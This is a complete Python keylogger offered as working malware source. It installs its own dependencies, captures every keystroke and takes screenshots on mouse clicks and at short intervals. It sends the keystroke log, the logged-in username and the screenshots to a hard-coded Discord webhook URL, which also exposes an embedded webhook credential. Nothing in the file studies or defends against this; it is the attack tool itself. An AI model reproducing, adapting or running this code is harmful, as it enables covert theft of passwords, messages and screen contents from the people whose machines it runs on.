import os
import subprocess
import time
import socket
import io
import platform
import sys
from datetime import datetime


# Required modules
required_modules = [
    "discord_webhook",
    "pynput",
    "Pillow"
]


def install_module(module_name):
    try:
        print(f"Installing {module_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        print(f"{module_name} installed successfully!")
    except Exception as e:
        print(f"Failed to install {module_name}: {e}")

# Install required modules if not already installed
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        install_module(module)


from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput import keyboard, mouse
from PIL import ImageGrab


SEND_REPORT_EVERY = 5
WEBHOOK = "https://discord.com/api/webhooks/1211548381877510214/U7k4cDdWpaH2LYJXqAY8lW5qQETK-YbKUjnv4zg-XbWT-vVQLOM3Wa2CyEcC3OY3foyG"

class Keylogger:
    def __init__(self, interval, report_method="webhook"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.username = os.getlogin()
        self.listener = keyboard.Listener(on_release=self.callback)
        self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
        self.running = True

    def callback(self, key):
        try:
            name = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                name = " "
            elif key == keyboard.Key.enter:
                name = "[ENTER]\n"
            elif key == keyboard.KeyCode.from_char('.'):
                name = "."
            else:
                name = f"[{key.name.upper()}]"

        self.log += name

    def on_mouse_click(self, x, y, button, pressed):
        if pressed:
            self.report_to_webhook(self.capture_and_send_screenshot())

    def capture_and_send_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_bytes = io.BytesIO()
            screenshot.save(screenshot_bytes, format='PNG')
            return screenshot_bytes.getvalue()
        except Exception as e:
            print(f"Failed to capture and send screenshot: {e}")
            return None

    def report_to_webhook(self, screenshot_data):
        try:
            webhook = DiscordWebhook(url=WEBHOOK)
            if len(self.log) > 2000:
                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {datetime.now().strftime('%d/%m/%Y %H:%M')}", description=self.log)
                webhook.add_embed(embed)
            else:
                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {datetime.now().strftime('%d/%m/%Y %H:%M')}", description=self.log)
                webhook.add_embed(embed)

            if screenshot_data:
                webhook.add_file(file=screenshot_data, filename='screenshot.png')

            webhook.execute()
        except (socket.gaierror, Exception) as e:
            print(f"Failed to execute webhook:{e}")

    def report(self):
        while self.running:
            try:
                if self.log:
                    if self.report_method == "webhook":
                        self.report_to_webhook(self.capture_and_send_screenshot())
                self.log = ""
                time.sleep(self.interval)
            except KeyboardInterrupt:
                break

    def run_keylogger(self):
        self.mouse_listener.start()
        with self.listener as self.listener:
            self.report()

    def stop(self):
        self.running = False
        self.listener.stop()
        self.mouse_listener.stop()

# Running the Class keylogger
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")
    keylogger.run_keylogger()
